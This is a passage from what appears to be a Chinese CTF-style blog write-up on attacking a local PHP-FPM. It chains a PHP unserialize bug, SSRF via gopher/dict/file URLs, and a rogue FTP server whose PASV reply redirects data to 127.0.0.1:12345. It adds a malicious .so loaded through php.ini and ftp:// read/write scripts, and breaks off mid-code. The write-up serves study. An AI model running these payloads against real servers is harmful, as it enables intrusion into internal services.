&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_HEADER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;crawldata&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$crl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用p牛脚本生成payload，直接ssrf伪协议好像也行？没环境，云一下了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gopher://127.0.0.1:9001/_xxxxxxxx&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;dict://127.0.0.1:80/info&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;file:///proc/net/arp&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将序列化之后的结果传入crawldata&lt;/p>
&lt;h3 id="结合ftppasv-mode攻击本地php-fpm">结合ftp&amp;amp;PASV mode攻击本地php-fpm&lt;/h3>
&lt;h4 id="ftp使用pasv模式转发ftp-data">ftp使用PASV模式转发ftp-data&lt;/h4>
&lt;p>先简单测试ftp连接进行抓包&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112195819783.png" alt="image-20211112195819783">&lt;/p>
&lt;p>其中的&lt;code>227 Entering Passive Mode (192,168,187,3,230,20)&lt;/code>的括号内的内容表示的是传输的FTP-DATA打向的位置，前一部分是ip，端口是230*256+20=58900&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112200459682.png" alt="image-20211112200459682">&lt;/p>
&lt;p>可以看到我们文件内容是150ok之后才被传出去的，而且会被放在FTP-DATA中被上传和下载&lt;/p>
&lt;p>我们可以模拟一个ftp-server，在响应PASV命令（即passive 切换被动模式）时返回&lt;code>(127,0,0,1,0,12345)&lt;/code>来让FTP-DATA打向内网12345端口；这是一个恶意ftp-server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 192.168.187.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;215 UNIX Type: L8&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在另一台192.168.187.3上访问这个恶意服务，期间传输的文件就会被转发到192.168.187.3自己的12345端口&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112233757565.png" alt="image-20211112233757565">&lt;/p>
&lt;h4 id="php加载恶意so文件">php加载恶意.so文件&lt;/h4>
&lt;p>修改php.ini /etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">[PHP]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">extension&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">/home/amelia/TEMP/fpm/wuhu.so&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>C源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;touch /home/amelia/TEMP/fpm/pwned&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译为.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行php即触发恶意.so&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112162658685.png" alt="image-20211112162658685">&lt;/p>
&lt;h4 id="令php使用ftp">令php使用ftp://&lt;/h4>
&lt;p>/etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">allow_url_fopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">On&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ftp读 注意后面的路径都需要绝对路径&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php ftp_read.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/flag.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112215002622.png" alt="image-20211112215002622">&lt;/p>
&lt;p>ftp写&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$agrv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#75af00">ftp_write&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;hello, world&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112223440182.png" alt="image-20211112223440182">&lt;/p>
&lt;p>但是这里一直是可以新建文件但是写入不了，读入的参数2一直是int(0)，暂时还没解决问题（不过用下面那个写入很正常……&lt;/p>
&lt;p>覆盖已存在文件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_context_create&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ftp&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;overwrite&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$context&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php ftp_write_2.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;newwwwew&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112225832777.png" alt="image-20211112225832777">&lt;/p>
&lt;h4 id="令php使用ftp并转发ftp-data">令php使用ftp://并转发FTP-DATA&lt;/h4>
&lt;p>将上面的操作用wireshark抓个包看看流量&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112230401822.png" alt="image-20211112230401822">&lt;/p>
&lt;p>可以看到用的是EPSV mode而不是PASV mode，不会有括号内的ip+port描述，FTP-DATA只会被打向控制连接的服务端的端口，不能做到FTP-DATA的任意转发&lt;/p>
&lt;p>不过也不是毫无办法，如果用EPSV命令返回的结果不是229，那么php的ftp://就会使用PASV命令&lt;/p>
&lt;p>将上面的ftp-server修改一下，将229响应设为了000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
